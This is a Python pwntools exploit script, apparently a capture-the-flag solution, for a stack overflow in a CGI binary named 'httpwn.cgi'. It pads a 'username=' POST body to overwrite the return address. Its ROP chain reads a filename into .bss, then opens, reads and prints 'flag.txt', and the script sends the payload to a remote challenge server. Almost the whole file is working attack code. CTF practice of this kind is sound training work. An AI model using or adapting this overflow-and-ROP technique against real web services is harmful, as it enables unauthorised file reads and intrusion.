import requests
from pwn import *

# Context setup (compile locally first to get this file!)
# gcc src/main.c -o httpwn.cgi -Wall -fno-stack-protector -no-pie -static
exe = ELF('./httpwn.cgi')
context.binary = exe
rop = ROP(exe)

# --- Configuration ---
# You must find this offset using GDB (e.g., cyclic pattern)
# data(48) + saved_rbp(8) -> ret usually around 56 bytes.
# Since we prefix 'username=', padding is OFFSET - 9.
offset = 56 
writable_area = exe.bss()

# --- ROP Chain Construction ---

# 1. Read "flag.txt" from our input into .bss
# We will append "flag.txt" at the very end of our HTTP body
rop.read(0, writable_area, 8) 

# 2. Open("flag.txt", 0)
rop.open(writable_area, 0)

# 3. Read(fd=3, buf=writable_area, len=100)
# Note: fd is likely 3 because 0,1,2 are stdin/out/err
rop.read(3, writable_area, 100)

# 4. Write(fd=1, buf=writable_area, len=100)
rop.write(1, writable_area, 100)

# --- Payload Assembly ---
payload = b'username='
payload += b'A' * (offset - 9)
payload += rop.chain()
# The ROP chain will execute the first 'read'. We need to provide the filename there.
payload += b'flag.txt' 

print(f"[*] Payload Len: {len(payload)}")
print(f"[*] Sending payload to target...")

# --- Send Request ---
url = "http://gzcli.techcomfest.1pc.tf:61555/cgi-bin/httpwn.cgi"

# The Content-Length will be automatically set to len(payload)
r = requests.post(url, data=payload, verify=False)

print("-" * 20)
print(r.text) # The flag should be printed here
print("-" * 20)
